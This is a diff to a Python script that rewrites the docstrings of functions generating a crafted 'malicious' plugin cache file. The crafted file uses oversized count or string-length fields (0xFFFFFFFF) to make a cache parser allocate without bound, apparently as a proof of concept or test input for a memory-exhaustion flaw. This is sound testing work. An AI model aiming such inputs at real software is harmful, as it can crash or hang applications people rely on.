@@ -15,18 +15,29 @@ import sys
 import os
 
 def write_string(f, s):
-    """Write a length-prefixed string to the cache file."""
+    """
+    Write a UTF-8 string with a 4-byte little-endian length prefix to a binary file.
+    
+    Parameters:
+        f (BinaryIO): Open binary file or file-like object positioned for writing; the function writes bytes to it.
+        s (str): The string to encode as UTF-8 and write (prefixed by its uint32 little-endian length).
+    """
     data = s.encode("utf-8")
     f.write(struct.pack("<I", len(data)))
     f.write(data)
 
 def create_malicious_cache(output_path, mode="count"):
     """
-    Create a crafted plugin_cache.bin file.
-
-    mode="count": Set plugin count to 0xFFFFFFFF (attempt massive reserve)
-    mode="string": Set count=1 but string length to 0xFFFFFFFF (massive alloc)
-    mode="many": Set count=100000 with normal strings (cumulative pressure)
+    Generate a crafted NPSC-format plugin cache file intended to provoke unbounded-allocation behavior in a cache parser.
+    
+    Creates a binary file at output_path containing the NPSC magic and version header, then writes additional fields chosen by mode to trigger large or excessive allocations when the file is parsed.
+    
+    Parameters:
+        output_path (str): Filesystem path where the crafted plugin_cache.bin will be written. Parent directories are created if needed.
+        mode (str): Controls the crafted payload written after the header:
+            - "count": writes a plugin count of 0xFFFFFFFF to provoke an extremely large reserve for the plugins vector.
+            - "string": writes a plugin count of 1 and a following string length of 0xFFFFFFFF to provoke a very large string allocation.
+            - "many": writes a plugin count of 100000 to create cumulative allocation pressure (no subsequent string data is written).
     """
     os.makedirs(os.path.dirname(output_path) if os.path.dirname(output_path) else ".", exist_ok=True)
 
